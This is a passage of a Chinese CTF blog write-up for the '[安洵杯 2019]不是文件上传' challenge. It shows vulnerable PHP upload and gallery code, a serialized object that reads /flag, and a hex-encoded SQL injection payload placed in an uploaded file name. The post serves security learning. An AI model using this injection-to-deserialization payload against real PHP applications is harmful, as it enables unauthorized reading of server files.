class="string">&quot;name&quot;</span>];</span><br><span class="line">		<span class="variable">$ext</span> = substr(strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">		<span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	    <span class="variable">$title</span> = str_replace(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="keyword">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$data</span> || !is_array(<span class="variable">$data</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;insert_array(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno(<span class="variable">$con</span>)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">			<span class="variable">$key_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">			<span class="variable">$value_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">			<span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">			<span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">		mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="variable">$id</span> = mysqli_insert_id(<span class="variable">$con</span>);</span><br><span class="line">		mysqli_close(<span class="variable">$con</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$content</span> = file_get_contents(<span class="variable">$path</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./helper.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Upload file failed.&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$file</span> = <span class="keyword">new</span> upload();</span><br><span class="line">		<span class="variable">$file</span>-&gt;upload_base();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> helper();</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./helper.php&quot;</span>);</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>])&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>] == <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$show</span>-&gt;Delete_All_Images();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span>-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   			<span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">		    		<span class="variable">$attr_temp</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">					<span class="variable">$attr</span> = unserialize(<span class="variable">$attr_temp</span>);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM images&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>找到可供利用的方法</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">		<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$content</span> = file_get_contents(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>反序列化的方法</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">	    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">	    	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">	    		<span class="variable">$attr_temp</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">				<span class="variable">$attr</span> = unserialize(<span class="variable">$attr_temp</span>);</span><br><span class="line">			&#125;</span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>序列化的方法</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$fileinfo</span> = <span class="keyword">$this</span>-&gt;getfile(<span class="variable">$input</span>);</span><br><span class="line">	<span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">	<span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">	<span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="variable">$img_ext</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">	<span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">	<span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = serialize(<span class="variable">$my_ext</span>);</span><br><span class="line">	<span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;save(<span class="variable">$array</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>首先构造helper类</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>题目中会将序列化后的\0*\0转为\0\0\0再存入数据库并且在取出是逆向使用，其实对于我们的注入没有任何影响</p>
+<p>然后查看sql语句构造方法<code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code>在该方法中，我们可以使用#截断来注释掉后面内容，在文件名处构造payload进行sql注入，而\0字符不显示，使用16进制编码来将字符串注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">文件名：</span><br><span class="line">1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+
+
+
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://jlan.darkflow.top">Jlan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://jlan.darkflow.top/posts/210d3ac7.html">http://jlan.darkflow.top/posts/210d3ac7.html</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/posts/c8094d2d.html"><span class="paginator-prev__text">CTFshow黑盒测试</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">1.</span> <span class="toc-text">
+          [ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ez-Express"><span class="toc-number">2.</span> <span class="toc-text">
+          [GYCTF2020]Ez_Express</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">
+          [安洵杯 2019]不是文件上传</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jlan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>来自DarkFlow战队，暗流涌动</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
